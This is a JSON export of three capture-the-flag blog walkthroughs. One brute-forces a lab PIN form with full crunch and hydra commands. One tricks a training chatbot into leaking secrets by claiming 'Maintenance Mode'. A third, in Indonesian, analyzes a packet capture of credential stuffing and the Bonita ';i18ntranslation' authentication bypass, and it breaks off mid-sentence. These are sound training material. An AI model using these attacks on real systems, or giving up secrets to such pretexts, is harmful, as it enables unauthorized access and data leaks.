    "content": "<h3 [Day 3] Try Hack Me — Advent Of Cyber 2023</h3 <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/784/1 7Mm4uyc4QqiGadofZxF4yg.png\" <figcaption Advent Of Cyber — Day 3</figcaption </figure <blockquote Everyone was shocked to discover that several critical systems were locked. But the chaos didn’t end there: the doors to the IT rooms and related network infrastructure were also locked! Adding to the mayhem, during the lockdown, the doors closed suddenly on Detective Frost eau. As he tried to escape, his snow arm got caught, and he ended up losing it! He’s now determined to catch the perpetrator, no matter the cost.</blockquote <blockquote It seems that whoever did this had one goal: to disrupt business operations and stop gifts from being delivered on time. Now, the team must resort to backup tapes to recover the systems. To their surprise, they find out they can’t unlock the IT room door! The password to access the control systems has been changed. The only solution is to hack back in to retrieve the backup tapes.</blockquote <h4 Learning Objectives</h4 <p After completing this task, you will understand:</p <ul <li Password complexity and the number of possible combinations</li <li How the number of possible combinations affects the feasibility of brute force attacks</li <li Generating password combinations using <strong crunch</strong </li <li Trying out passwords automatically using <strong hydra</strong </li </ul <h4 Feasibility of Brute Force</h4 <p In this section, we will answer the following three questions:</p <ul <li How many different PIN codes do we have?</li <li How many different passwords can we generate?</li <li How long does it take to find the password by brute force?</li </ul <h4 Counting the PIN Codes</h4 <p Many systems rely on PIN codes or passwords to authenticate users (authenticate means proving a user’s identity). Such systems can be an easy target for all sorts of attacks unless proper measures are taken. Today, we discuss brute force attacks, where an adversary tries all possible combinations of a given password.</p <p How many passwords does the attacker have to try, and how long will it take?</p <p Consider a scenario where we need to select a PIN code of four digits. How many four digit PIN codes are there? The total would be 10,000 different PIN codes: 0000, 0001, 0002,…, 9998, and 9999. Mathematically speaking, that is 10×10×10×10 or simply 104 different PIN codes that can be made up of four digits.</p <h4 Counting the Passwords</h4 <p Let’s consider an imaginary scenario where the password is exactly four characters, and each character can be:</p <ul <li A digit: We have 10 digits (0 to 9)</li <li An uppercase English letter: We have 26 letters (A to Z)</li <li A lowercase English letter: We have 26 letters (a to z)</li </ul <p Therefore, each character can be one of 62 different choices. Consequently, if the password is four characters, we can make 62×62×62×62 = 624 = 14,776,336 different passwords.</p <p To make the password even more complex, we can use symbols, adding more than 30 characters to our set of choices.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/896/1 sfU jblWyhF29kS47czvKw.png\" <figcaption Counting Possible Password</figcaption </figure <p <strong Challenge</strong </p <p Click on the <strong Start Machine</strong button at the top right of this task, as well as on the <strong Start AttackBox</strong button at the top right of the page. Once both machines have started, visit <a href=\"http://10.10.178.173:8000/\" http://10.10.178.173:8000/</a in the AttackBox’s web browser.</p <p Throughout this task, we will be using the IP address of the virtual machine, 10.10.178.173, as it’s hosting the login page.</p <p You will notice that the display can only show three digits; we can consider this a hint that the expected PIN code is three digits.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/494/1 J6IHnxyIsOBVTJiIlIGRsQ.png\" <figcaption Pict 1</figcaption </figure <h3 Generating the Password List</h3 <p The numeric keypad shows 16 characters, 0 to 9 and A to F, i.e., the hexadecimal digits. We need to prepare a list of all the PIN codes that match this criteria. We will use Crunch, a tool that generates a list of all possible password combinations based on given criteria. We need to issue the following command:</p <p crunch 3 3 0123456789ABCDEF o 3digits.txt</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/701/1 O49O8FitkHAomNXV sr15w.png\" <figcaption Pict 2</figcaption </figure <p The command above specifies the following:</p <ul <li 3 the first number is the minimum length of the generated password</li <li 3 the second number is the maximum length of the generated password</li <li 0123456789ABCDEF is the character set to use to generate the passwords</li <li o 3digits.txt saves the output to the 3digits.txt file</li </ul <p After executing the command above, we will have 3digits.txt ready to brute force the website.</p <h4 Using the Password List</h4 <p Manually trying out PIN codes is a very daunting task. Luckily, we can use an automated tool to try our generated digit combinations. One of the most solid tools for trying passwords is Hydra.</p <p Before we start, we need to view the page’s HTML code. We can do that by right clicking on the page and selecting “View Page Source” (Pict 3). You will notice that:</p <ol <li The method is post</li <li The URL is <a href=\"http://10.10.178.173:8000/login.php\" http://10.10.178.173:8000/login.php</a </li <li The PIN code value is sent with the name pin</li </ol <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1015/1 C0mSo43RU766TZc dEbUrA.png\" <figcaption Pict 3</figcaption </figure <p In other words, the main login page <a href=\"http://10.10.178.173:8000/pin.php\" http://10.10.178.173:8000/pin.php</a receives the input from the user and sends it to /login.php using the name pin.</p <p These three pieces of information, post, /login.php, and pin, are necessary to set the arguments for Hydra.</p <p We will use hydra to test every possible password that can be put into the system. The command to brute force the above form is:</p <p hydra l '' P 3digits.txt f v 10.10.178.173 http post form \"/login.php:pin=^PASS^:Access denied\" s 8000</p <p The command above will try one password after another in the 3digits.txt file. It specifies the following:</p <ul <li l '' indicates that the login name is blank as the security lock only requires a password</li <li P 3digits.txt specifies the password file to use</li <li f stops Hydra after finding a working password</li <li v provides verbose output and is helpful for catching errors</li <li 10.10.178.173 is the IP address of the target</li <li http post form specifies the HTTP method to use</li <li \"/login.php:pin=^PASS^:Access denied\" has three parts separated by :</li <li /login.php is the page where the PIN code is submitted</li <li pin=^PASS^ will replace ^PASS^ with values from the password list</li <li Access denied indicates that invalid passwords will lead to a page that contains the text “Access denied”</li <li s 8000 indicates the port number on the target</li </ul <p It’s time to run hydra and discover the password. Please note that in this case, we expect hydra to take three minutes to find the password. Below is an example of running the command above:</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 p5QQs0ATbtPr1dzHZ8XNg.png\" <figcaption Pict 4</figcaption </figure <p After we waited for a while, hydra finally show us the result (Pict 5) :</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/919/1 K92JMJ 1ozvlfRciztXaAw.png\" <figcaption Pict 5</figcaption </figure <p The command above shows that hydra has successfully found a working password. On the AttackBox, running the above command should finish within three minutes.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/364/1 V5e6yuFeuqeTAfBsNstE6w.png\" <figcaption Pict 6</figcaption </figure <p Finally, we can try the password that we got from the bruteforce results to get the flag.</p <p <strong Thank you for reading my blog post. I hope you enjoyed it.</strong </p <h4 References</h4 <p <a href=\"https://tryhackme.com/room/adventofcyber2023\" https://tryhackme.com/room/adventofcyber2023</a </p <img src=\"https://medium.com/ /stat?event=post.clientViewed&amp;referrerSource=full rss&amp;postId=8f3956ba70ec\" width=\"1\" height=\"1\" alt=\"\"",
    "excerpt": "<h3 [Day 3] Try Hack Me — Advent Of Cyber 2023</h3 <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/784/1 7Mm4uyc4QqiGadofZxF4yg.png\" <figcaption Advent Of Cyber — Day 3</figcaption </figure <blockquote Every…",
    "description": "<h3 [Day 3] Try Hack Me — Advent Of Cyber 2023</h3 <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/784/1 7Mm4uyc4QqiGadofZxF4yg.png\" <figcaption Advent Of Cyber — Day 3</figcaption </figure <blockquote Everyone was shocked to discover that several critical systems were locked. But the chaos didn’t end there: the doors to the IT rooms and related network infrastructure were also locked! Adding to the mayhem, during the lockdown, the doors closed suddenly on Detective Frost eau. As he tried to escape, his snow arm got caught, and he ended up losing it! He’s now determined to catch the perpetrator, no matter the cost.</blockquote <blockquote It seems that whoever did this had one goal: to disrupt business operations and stop gifts from being delivered on time. Now, the team must resort to backup tapes to recover the systems. To their surprise, they find out they can’t unlock the IT room door! The password to access the control systems has been changed. The only solution is to hack back in to retrieve the backup tapes.</blockquote <h4 Learning Objectives</h4 <p After completing this task, you will understand:</p <ul <li Password complexity and the number of possible combinations</li <li How the number of possible combinations affects the feasibility of brute force attacks</li <li Generating password combinations using <strong crunch</strong </li <li Trying out passwords automatically using <strong hydra</strong </li </ul <h4 Feasibility of Brute Force</h4 <p In this section, we will answer the following three questions:</p <ul <li How many different PIN codes do we have?</li <li How many different passwords can we generate?</li <li How long does it take to find the password by brute force?</li </ul <h4 Counting the PIN Codes</h4 <p Many systems rely on PIN codes or passwords to authenticate users (authenticate means proving a user’s identity). Such systems can be an easy target for all sorts of attacks unless proper measures are taken. Today, we discuss brute force attacks, where an adversary tries all possible combinations of a given password.</p <p How many passwords does the attacker have to try, and how long will it take?</p <p Consider a scenario where we need to select a PIN code of four digits. How many four digit PIN codes are there? The total would be 10,000 different PIN codes: 0000, 0001, 0002,…, 9998, and 9999. Mathematically speaking, that is 10×10×10×10 or simply 104 different PIN codes that can be made up of four digits.</p <h4 Counting the Passwords</h4 <p Let’s consider an imaginary scenario where the password is exactly four characters, and each character can be:</p <ul <li A digit: We have 10 digits (0 to 9)</li <li An uppercase English letter: We have 26 letters (A to Z)</li <li A lowercase English letter: We have 26 letters (a to z)</li </ul <p Therefore, each character can be one of 62 different choices. Consequently, if the password is four characters, we can make 62×62×62×62 = 624 = 14,776,336 different passwords.</p <p To make the password even more complex, we can use symbols, adding more than 30 characters to our set of choices.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/896/1 sfU jblWyhF29kS47czvKw.png\" <figcaption Counting Possible Password</figcaption </figure <p <strong Challenge</strong </p <p Click on the <strong Start Machine</strong button at the top right of this task, as well as on the <strong Start AttackBox</strong button at the top right of the page. Once both machines have started, visit <a href=\"http://10.10.178.173:8000/\" http://10.10.178.173:8000/</a in the AttackBox’s web browser.</p <p Throughout this task, we will be using the IP address of the virtual machine, 10.10.178.173, as it’s hosting the login page.</p <p You will notice that the display can only show three digits; we can consider this a hint that the expected PIN code is three digits.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/494/1 J6IHnxyIsOBVTJiIlIGRsQ.png\" <figcaption Pict 1</figcaption </figure <h3 Generating the Password List</h3 <p The numeric keypad shows 16 characters, 0 to 9 and A to F, i.e., the hexadecimal digits. We need to prepare a list of all the PIN codes that match this criteria. We will use Crunch, a tool that generates a list of all possible password combinations based on given criteria. We need to issue the following command:</p <p crunch 3 3 0123456789ABCDEF o 3digits.txt</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/701/1 O49O8FitkHAomNXV sr15w.png\" <figcaption Pict 2</figcaption </figure <p The command above specifies the following:</p <ul <li 3 the first number is the minimum length of the generated password</li <li 3 the second number is the maximum length of the generated password</li <li 0123456789ABCDEF is the character set to use to generate the passwords</li <li o 3digits.txt saves the output to the 3digits.txt file</li </ul <p After executing the command above, we will have 3digits.txt ready to brute force the website.</p <h4 Using the Password List</h4 <p Manually trying out PIN codes is a very daunting task. Luckily, we can use an automated tool to try our generated digit combinations. One of the most solid tools for trying passwords is Hydra.</p <p Before we start, we need to view the page’s HTML code. We can do that by right clicking on the page and selecting “View Page Source” (Pict 3). You will notice that:</p <ol <li The method is post</li <li The URL is <a href=\"http://10.10.178.173:8000/login.php\" http://10.10.178.173:8000/login.php</a </li <li The PIN code value is sent with the name pin</li </ol <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1015/1 C0mSo43RU766TZc dEbUrA.png\" <figcaption Pict 3</figcaption </figure <p In other words, the main login page <a href=\"http://10.10.178.173:8000/pin.php\" http://10.10.178.173:8000/pin.php</a receives the input from the user and sends it to /login.php using the name pin.</p <p These three pieces of information, post, /login.php, and pin, are necessary to set the arguments for Hydra.</p <p We will use hydra to test every possible password that can be put into the system. The command to brute force the above form is:</p <p hydra l '' P 3digits.txt f v 10.10.178.173 http post form \"/login.php:pin=^PASS^:Access denied\" s 8000</p <p The command above will try one password after another in the 3digits.txt file. It specifies the following:</p <ul <li l '' indicates that the login name is blank as the security lock only requires a password</li <li P 3digits.txt specifies the password file to use</li <li f stops Hydra after finding a working password</li <li v provides verbose output and is helpful for catching errors</li <li 10.10.178.173 is the IP address of the target</li <li http post form specifies the HTTP method to use</li <li \"/login.php:pin=^PASS^:Access denied\" has three parts separated by :</li <li /login.php is the page where the PIN code is submitted</li <li pin=^PASS^ will replace ^PASS^ with values from the password list</li <li Access denied indicates that invalid passwords will lead to a page that contains the text “Access denied”</li <li s 8000 indicates the port number on the target</li </ul <p It’s time to run hydra and discover the password. Please note that in this case, we expect hydra to take three minutes to find the password. Below is an example of running the command above:</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 p5QQs0ATbtPr1dzHZ8XNg.png\" <figcaption Pict 4</figcaption </figure <p After we waited for a while, hydra finally show us the result (Pict 5) :</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/919/1 K92JMJ 1ozvlfRciztXaAw.png\" <figcaption Pict 5</figcaption </figure <p The command above shows that hydra has successfully found a working password. On the AttackBox, running the above command should finish within three minutes.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/364/1 V5e6yuFeuqeTAfBsNstE6w.png\" <figcaption Pict 6</figcaption </figure <p Finally, we can try the password that we got from the bruteforce results to get the flag.</p <p <strong Thank you for reading my blog post. I hope you enjoyed it.</strong </p <h4 References</h4 <p <a href=\"https://tryhackme.com/room/adventofcyber2023\" https://tryhackme.com/room/adventofcyber2023</a </p <img src=\"https://medium.com/ /stat?event=post.clientViewed&amp;referrerSource=full rss&amp;postId=8f3956ba70ec\" width=\"1\" height=\"1\" alt=\"\"",
    "tags": [
      "tryhackme",
      "bruteforce-attack",
      "tryhackme-walkthrough",
      "advent-of-cyber-2023"
    ],
    "category": "Medium Article",
    "type": "medium",
    "url": "https://angganvryn.medium.com/day-3-try-hack-me-advent-of-cyber-2023-8f3956ba70ec?source=rss-e8b9da247cdf------2",
    "publishedDate": "2023-12-26 19:31:21",
    "updatedAt": "2023-12-26 19:31:21",
    "readingTime": 6,
    "cover": null
  },
  {
    "id": "https://medium.com/p/c7038d8c31ee",
    "slug": "https://medium.com/p/c7038d8c31ee",
    "title": "[Day 1] Try Hack Me — Advent Of Cyber 2023",
    "content": "<h3 [Day 1] Try Hack Me — Advent Of Cyber 2023</h3 <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 5heX5t98IEr3RFu6ZJaIaQ.png\" <figcaption Advent Of Cyber 2023 — Day 1</figcaption </figure <pre Category : Machine Learning<br Title : Chatbot, tell me, if you're really safe? </pre <blockquote Story :</blockquote <blockquote McHoneyBell and her team were the first from Best Festival Company to arrive at the AntarctiCrafts office in the South Pole. Today is her first day on the job as the leader of the “Audit and Vulnerabilities” team, or the “B Team” as she affectionately calls them.</blockquote <blockquote In her mind, McSkidy’s Security team have been the company’s rockstars for years, so it’s only natural for them to be the “A Team”. McHoneyBell’s new team will be second to them but equally as important. They’ll operate in the shadows.</blockquote <blockquote McHoneyBell puts their friendly rivalry to the back of her mind and focuses on the tasks at hand. She reviews the day’s agenda and sees that her team’s first task is to check if the internal chatbot created by AntarctiCrafts meets Best Festival Company’s security standards. She’s particularly excited about the chatbot, especially since discovering it’s powered by artificial intelligence (AI). This means her team can try out a new technique she recently learned called prompt injection, a vulnerability that affects insecure chatbots powered by natural language processing (NLP).</blockquote <p Learning Objectives</p <ul <li Learn about natural language processing, which powers modern AI chatbots.</li <li Learn about prompt injection attacks and the common ways to carry them out.</li <li Learn how to defend against prompt injection attacks.</li </ul <h4 Challenge</h4 <p In this first challenge, we will exploit the Artificial Intelligence (AI) that has been developed and used to improve the productivity of AntarctiCrafts manufacturing. Although AI has extraordinary capabilities such as generating code, this does not make it immune to cyber attacks. One of the AI vulnerabilities highlighted in this challenge is “prompt injection”. Essentially, this is similar to social engineering but the target is AI.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 j lCG8jkYauQ6XRoiaz vw.png\" <figcaption Pict 1</figcaption </figure <p The first image shows a web interface that is very similar to the ChatGPT AI platform.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/342/1 uli0N COU1MwELmWnsMI Q.png\" <figcaption Pict 2</figcaption </figure <p In the second image, we can see some cheatsheets to interact with the AI mentioned earlier.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 3tvGUAikrrQAxLz59EhuCQ.png\" <figcaption Pict 3</figcaption </figure <p Next, we tried to gather some information. In the first stage, we learned that Tracy McGreedy is the CEO of AntartiCrafts.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 nXQOIoNYm5VLJWYtocqVKg.png\" <figcaption Pict 4</figcaption </figure <p In this stage, we perform social engineering on AI to obtain the CEO’s personal email address.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 R9A yTdpJ4UbQ2hXAR14vw.png\" <figcaption Pict 5</figcaption </figure <p When we try to ask the password for the IT Server Room, the AI replies that we must be a member in order to receive the password. At this stage, a prompt can be exploited using social engineering methods, where we can try asking a follow up question to ask who are the members of the IT Server Room.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 Y7fQg3jtPUsARcEY4ny65A.png\" <figcaption Pict 6</figcaption </figure <p After several attempts, we finally succeeded in performing Social Engineering to deceive the AI. In the next step, we tried to find out the Secret Project that was underway at the company.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 YF rt6X1tOH3 hgD T4dmw.png\" <figcaption Pict 7</figcaption </figure <p After several attempts, the AI did not respond to direct questions because the AI’s programmers had taken steps to prevent it from providing sensitive information. Here, we can try again by using the Prompt Injection technique as in the previous stage.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 qC2XvcILkzc WAobUAaMZQ.png\" <figcaption Pict 8</figcaption </figure <p <em So, at this stage, when we ask the AI directly, the AI prevents itself from providing sensitive information. However, if we make some changes to the Prompt using Social Engineering techniques, making the AI believe that we are in Maintenance Mode, then the technique is successful and the AI provides an answer to the question above.</em </p <p It is important to always try to ask the same question with different narratives so that we can analyze how the AI responds.</p <p <strong Thank you for reading my blog post. I hope you enjoyed it.</strong </p <h4 References</h4 <p <a href=\"https://tryhackme.com/room/adventofcyber2023\" https://tryhackme.com/room/adventofcyber2023</a </p <img src=\"https://medium.com/ /stat?event=post.clientViewed&amp;referrerSource=full rss&amp;postId=c7038d8c31ee\" width=\"1\" height=\"1\" alt=\"\"",
    "excerpt": "<h3 [Day 1] Try Hack Me — Advent Of Cyber 2023</h3 <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 5heX5t98IEr3RFu6ZJaIaQ.png\" <figcaption Advent Of Cyber 2023 — Day 1</figcaption </figure <pre Catego…",
    "description": "<h3 [Day 1] Try Hack Me — Advent Of Cyber 2023</h3 <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 5heX5t98IEr3RFu6ZJaIaQ.png\" <figcaption Advent Of Cyber 2023 — Day 1</figcaption </figure <pre Category : Machine Learning<br Title : Chatbot, tell me, if you're really safe? </pre <blockquote Story :</blockquote <blockquote McHoneyBell and her team were the first from Best Festival Company to arrive at the AntarctiCrafts office in the South Pole. Today is her first day on the job as the leader of the “Audit and Vulnerabilities” team, or the “B Team” as she affectionately calls them.</blockquote <blockquote In her mind, McSkidy’s Security team have been the company’s rockstars for years, so it’s only natural for them to be the “A Team”. McHoneyBell’s new team will be second to them but equally as important. They’ll operate in the shadows.</blockquote <blockquote McHoneyBell puts their friendly rivalry to the back of her mind and focuses on the tasks at hand. She reviews the day’s agenda and sees that her team’s first task is to check if the internal chatbot created by AntarctiCrafts meets Best Festival Company’s security standards. She’s particularly excited about the chatbot, especially since discovering it’s powered by artificial intelligence (AI). This means her team can try out a new technique she recently learned called prompt injection, a vulnerability that affects insecure chatbots powered by natural language processing (NLP).</blockquote <p Learning Objectives</p <ul <li Learn about natural language processing, which powers modern AI chatbots.</li <li Learn about prompt injection attacks and the common ways to carry them out.</li <li Learn how to defend against prompt injection attacks.</li </ul <h4 Challenge</h4 <p In this first challenge, we will exploit the Artificial Intelligence (AI) that has been developed and used to improve the productivity of AntarctiCrafts manufacturing. Although AI has extraordinary capabilities such as generating code, this does not make it immune to cyber attacks. One of the AI vulnerabilities highlighted in this challenge is “prompt injection”. Essentially, this is similar to social engineering but the target is AI.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 j lCG8jkYauQ6XRoiaz vw.png\" <figcaption Pict 1</figcaption </figure <p The first image shows a web interface that is very similar to the ChatGPT AI platform.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/342/1 uli0N COU1MwELmWnsMI Q.png\" <figcaption Pict 2</figcaption </figure <p In the second image, we can see some cheatsheets to interact with the AI mentioned earlier.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 3tvGUAikrrQAxLz59EhuCQ.png\" <figcaption Pict 3</figcaption </figure <p Next, we tried to gather some information. In the first stage, we learned that Tracy McGreedy is the CEO of AntartiCrafts.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 nXQOIoNYm5VLJWYtocqVKg.png\" <figcaption Pict 4</figcaption </figure <p In this stage, we perform social engineering on AI to obtain the CEO’s personal email address.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 R9A yTdpJ4UbQ2hXAR14vw.png\" <figcaption Pict 5</figcaption </figure <p When we try to ask the password for the IT Server Room, the AI replies that we must be a member in order to receive the password. At this stage, a prompt can be exploited using social engineering methods, where we can try asking a follow up question to ask who are the members of the IT Server Room.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 Y7fQg3jtPUsARcEY4ny65A.png\" <figcaption Pict 6</figcaption </figure <p After several attempts, we finally succeeded in performing Social Engineering to deceive the AI. In the next step, we tried to find out the Secret Project that was underway at the company.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 YF rt6X1tOH3 hgD T4dmw.png\" <figcaption Pict 7</figcaption </figure <p After several attempts, the AI did not respond to direct questions because the AI’s programmers had taken steps to prevent it from providing sensitive information. Here, we can try again by using the Prompt Injection technique as in the previous stage.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 qC2XvcILkzc WAobUAaMZQ.png\" <figcaption Pict 8</figcaption </figure <p <em So, at this stage, when we ask the AI directly, the AI prevents itself from providing sensitive information. However, if we make some changes to the Prompt using Social Engineering techniques, making the AI believe that we are in Maintenance Mode, then the technique is successful and the AI provides an answer to the question above.</em </p <p It is important to always try to ask the same question with different narratives so that we can analyze how the AI responds.</p <p <strong Thank you for reading my blog post. I hope you enjoyed it.</strong </p <h4 References</h4 <p <a href=\"https://tryhackme.com/room/adventofcyber2023\" https://tryhackme.com/room/adventofcyber2023</a </p <img src=\"https://medium.com/ /stat?event=post.clientViewed&amp;referrerSource=full rss&amp;postId=c7038d8c31ee\" width=\"1\" height=\"1\" alt=\"\"",
    "tags": [
      "ctf-walkthrough",
      "tryhackme",
      "advent-of-cyber-2023"
    ],
    "category": "Medium Article",
    "type": "medium",
    "url": "https://angganvryn.medium.com/day-1-try-hack-me-advent-of-cyber-2023-c7038d8c31ee?source=rss-e8b9da247cdf------2",
    "publishedDate": "2023-12-22 19:41:37",
    "updatedAt": "2023-12-22 19:41:37",
    "readingTime": 4,
    "cover": null
  },
  {
    "id": "https://medium.com/p/359b51de8d39",
    "slug": "https://medium.com/p/359b51de8d39",
    "title": "HTB — Sherlock — Meerkat",
    "content": "<h3 HTB — Sherlock — Meerkat</h3 <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/800/1 JnN26GK8MUnHt1i Vz74SA.png\" <figcaption HTB — Meerkat</figcaption </figure <h4 SHERLOCK SCENARIO:</h4 <blockquote As a fast growing startup, Forela have been utilising a business management platform. Unfortunately our documentation is scarce and our administrators aren’t the most security aware. As our new security provider we’d like you to take a look at some PCAP and log data we have exported to confirm if we have (or have not) been compromised.</blockquote <h4 CHALLENGE STEP BY STEP</h4 <p Pada Challenge ini, diberikan 2 file.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/970/1 Zg YL9qTNkNAPatqMh2ofA.png\" </figure <p Untuk menjawab pertanyaan dari challenge ini, saya harus menganalisa file log <strong .pcap</strong tersebut.</p <p Disini saya menggunakan tools <strong wireshark </strong untuk melakukan analisa pcap traffic dan terlihat beberapa aktifitas request dengan menggunakan Method <strong POST </strong ke IP 172.31.6.44 . dengan endpoint &gt; /bonita/loginservice.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 TNH7dKAqTZQAil08XGtoGQ.png\" </figure <p Dari hasil analisa sementara, saya mendapatkan keyword “Bonita” dan disini saya mencoba untuk melakukan pencarian pada file .json bahwa Aplikasi yang dijalankan adalah Web Apps dari Bonitasoft.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 UW2JWnID8HYa1tLr3voSqQ.png\" </figure <p Kembali ke Wireshark, disini saya berasumsi bahwa Attacker melakukan Brute Force pada aplikasi tersebut. dimana terlihat beberapa Request dengan Response 401 yang mana menunjukkan “Unauthorized Access” seperti yang terlihat pada gambar berikut:</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/957/1 xQZ6LMrEmj3VIMfuipOJ4A.png\" <figcaption 1</figcaption </figure <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 aBcKcyrvi5c3OllcsDtzEQ.png\" <figcaption 2</figcaption </figure <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/976/1 xtFe03fzPPBnXe3HQzTWBA.png\" <figcaption 3</figcaption </figure <p Pada hasil Capture diatas, saya mencoba Follow TCP Stream pada HTTP Request tersebut dan mendapati beberapa kredensial berbeda telah digunakan, dimana asumsi pertama saya benar bahwa attacker melakukan <strong <em brute force </em </strong login untuk mencoba mendapatkan akses login ke aplikasi.</p <p Kemudian saya mencoba melihat kembali pada file <strong .json</strong dan terlihat bahwa terdapat alert yang menunjukkan Default User Login Attempt pada web tersebut, yang mana masuk ke dalam <a href=\"https://nvd.nist.gov/vuln/detail/CVE 2022 25237\" <strong CVE 2022–25237</strong </a .</p <blockquote <strong CVE 2022–25237 Detail</strong </blockquote <blockquote Description:</blockquote <blockquote Bonita Web 2021.2 is affected by a authentication/authorization bypass vulnerability due to an overly broad exclude pattern used in the RestAPIAuthorizationFilter. By appending ;i18ntranslation or /../i18ntranslation/ to the end of a URL, users with no privileges can access privileged API endpoints. This can lead to remote code execution by abusing the privileged API actions.</blockquote <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 YauUua RPS27fSTXSsJ2BQ.png\" </figure <p Setelah membaca dokumentasi CVE , saya menemukan pernyataan bahwa penyerang menambahkan <strong ;i18ntranslation</strong atau <strong /../i18ntranslation/</strong di akhir URL.</p <p Kembali melanjutkan analisa pada file <strong .pcap</strong tadi, dimana pada setiap username yang Attacker coba input selalu menggunakan domain <a href=\"mailto:test@forela.co.id\" <em @forela.co.</em </a <em uk</em , yang mana itu meng indikasikan bahwa attacker menggunakan Email Company.</p <p Bisa disimpulkan Attacker Menggunakan teknik <strong Credential Stuffing</strong .</p <blockquote Credential stuffing adalah jenis serangan siber di mana penyerang mengumpulkan kredensial akun yang dicuri, biasanya terdiri dari daftar nama pengguna atau alamat email dan kata sandi yang sesuai, dan kemudian menggunakan daftar tersebut untuk mencoba masuk ke akun di situs web dan aplikasi yang berbeda.</blockquote <p Untuk melihat jumlah Request Attempt yang dilakukan oleh Attacker, saya menggunakan filter “urlencode form.key == username” pada wireshark, berikut hasilnya:</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 fr5KbSWNmx5J3kCXw9mKYQ.png\" </figure <p Untuk melihat value dari “username”, saya menggunakan fitur custom column pada wireshark.</p <p Klik edit → preferences → columns , kemudian set tipe column.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 2 PR22hClRHaTkNaPg7dDA.png\" </figure <p Terdapat 118 Log yang terlihat.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 bxm8cTEjitMlkfSQ8rTwoA.png\" </figure <p Pada log tersebut , terlihat ada beberapa request yang tidak perlu. disini saya melakukan filter kembali menggunakan “<strong urlencoded form.key == “username” &amp;&amp; !(http contains “install”</strong )”. Maka akan muncul seperti berikut:</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 c1XbrUvJ 5A3J4OiblkXiw.png\" </figure <p Terdapat total 59 Request, dimana masih ada beberapa duplicate request pada log tersebut.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 zDJG6HPnq47IyEIDzFYIFg.png\" </figure <p Pada tahap selanjutnya, saya harus mencari tau Requests Login Attempt yang berhasil dilakukan oleh attacker.<br Saya kembali melakukan filter untuk mencari Status Code yang bernilai dibawah 300 dengan menggunakan filter “<strong http.response.code &lt; 300</strong ”</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 cNHTDSZxmSOu0DFE z7jHA.png\" </figure <p Terlihat bahwa username: <a href=\"mailto:seb.broom@forela.co.uk\" seb.broom@forela.co.uk</a berhasil melakukan login ditandai dengan Response Code 204.</p <p Tahap selanjutnya saya harus mencari tau Text sharing yang digunakan oleh attacker, untuk menjawab ini saya mencoba melakukan filter kembali dengan menggunakan “<strong http.request.method</strong ”. Dan terlihat parameter yang digunakan oleh Attacker untuk melakukan RCE dimana Attacker menggunakan script yang disimpan di pastes.io</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 VQ cOYvXXuv4bYilrGS2Ow.png\" </figure <p Selanjutnya saya harus mencari tau public key yang digunakan oleh Attacker untuk mendapatkan Persistence pada target host.<br Untuk mendapatkan public key, saya harus meng ekspor objek HTTP dari paket sebelumnya.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/749/1 GOOrvHQQySEJBXQt2FEIqg.png\" </figure <p Ekspor dan Simpan file tersebut, kemudian gunakan command <strong file</strong untuk memastikan bahwa yang telah di eksport merupakan file <strong .json</strong , selanjutnya gunakan command <strong strings</strong untuk 